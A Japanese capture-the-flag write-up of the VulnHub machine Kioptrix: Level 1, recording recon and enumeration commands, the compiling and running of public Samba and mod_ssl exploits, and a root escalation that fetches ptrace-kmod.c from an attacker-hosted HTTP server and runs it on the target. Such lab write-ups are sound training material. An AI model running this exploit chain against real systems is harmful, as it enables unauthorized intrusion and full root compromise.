# Kioptrix: Level 1

VulnHubの初心者向けマシン **Kioptrix: Level 1** の攻略メモです。

詳細な解説はNoteにまとめ、ここでは使用したコマンドと攻撃経路を中心に記録しています。

## Environment

```text
Attacker   : Kali Linux
Target     : Kioptrix: Level 1
Target IP  : 192.168.56.4
Difficulty : Easy
```

## Recon

```bash
ip addr
sudo netdiscover -r 192.168.56.0/24
```

Target:

```text
192.168.56.4
```

## Enumeration

```bash
sudo nmap -Pn -sS -sV 192.168.56.4
```

主な調査対象：

```text
Web
SMB / Samba
```

### Web

```bash
gobuster dir \
  -u http://192.168.56.4 \
  -w /usr/share/wordlists/dirb/common.txt

nikto -h http://192.168.56.4
```

確認した候補：

```text
mod_ssl 2.8.4
```

### SMB

```bash
nbtscan 192.168.56.4
smbclient -L //192.168.56.4 -N
smbclient //192.168.56.4/IPC$ -N
rpcclient -U "" -N 192.168.56.4
```

Nmap NSE:

```bash
nmap -Pn -p139,445 --script smb-os-discovery 192.168.56.4
nmap -Pn -p139,445 --script smb-enum-shares 192.168.56.4
nmap -Pn -p139,445 --script smb-enum-users 192.168.56.4
```

通常のEnumerationでは正確なSambaバージョンを取得できなかったため、WiresharkでSMB通信を確認。

```text
Samba 2.2.1a
```

## Vulnerability Analysis

```bash
searchsploit mod_ssl 2.8.4
searchsploit samba 2.2
```

攻撃候補：

```text
Samba 2.2.1a
mod_ssl 2.8.4
```

## Exploitation

### Samba

```bash
cp /usr/share/exploitdb/exploits/multiple/remote/10.c 10.c
gcc 10.c -o RCE

./RCE
./RCE -b 0 192.168.56.4
```

Result:

```bash
whoami
```

```text
root
```

### mod_ssl

```bash
cp /usr/share/exploitdb/exploits/unix/remote/47080.c 47080.c
gcc -o 47080 47080.c -lcrypto
```

```bash
./47080 0x6a 192.168.56.4
./47080 0x6b 192.168.56.4
```

Result:

```text
apache
```

## Privilege Escalation

Kali:

```bash
wget https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
python3 -m http.server 8000
```

Target:

```bash
wget http://192.168.56.3:8000/ptrace-kmod.c
gcc -o ptrace-kmod ptrace-kmod.c
./ptrace-kmod
```

```bash
whoami
```

```text
root
```

## Attack Paths

### Samba

```text
Samba 2.2.1a
    ↓
RCE
    ↓
root
```

### mod_ssl

```text
mod_ssl 2.8.4
    ↓
apache
    ↓
Local Privilege Escalation
    ↓
root
```

## Notes

今回特に印象に残ったのは、通常のSMB Enumerationでは取得できなかったSambaのバージョンを、Wiresharkで通信内容を確認することで特定できた点です。

詳細な手順や各コマンドの説明についてはNoteにまとめています。

> This write-up was created for educational purposes in an authorized local VulnHub environment.
